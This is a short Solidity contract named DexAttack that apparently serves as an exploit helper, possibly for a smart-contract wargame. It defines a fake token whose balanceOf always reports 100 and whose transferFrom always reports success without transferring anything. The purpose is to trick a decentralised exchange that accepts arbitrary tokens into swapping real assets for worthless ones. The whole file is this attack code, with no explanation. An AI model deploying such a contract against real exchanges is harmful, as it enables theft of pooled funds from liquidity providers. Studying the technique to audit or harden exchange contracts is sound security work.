// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DexAttack {
    function balanceOf(address _address) public pure returns (uint256) {
        return 100;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 amount
    ) public pure returns (bool) {
        return true;
    }

    function approve() public view {
        this;
    }
}
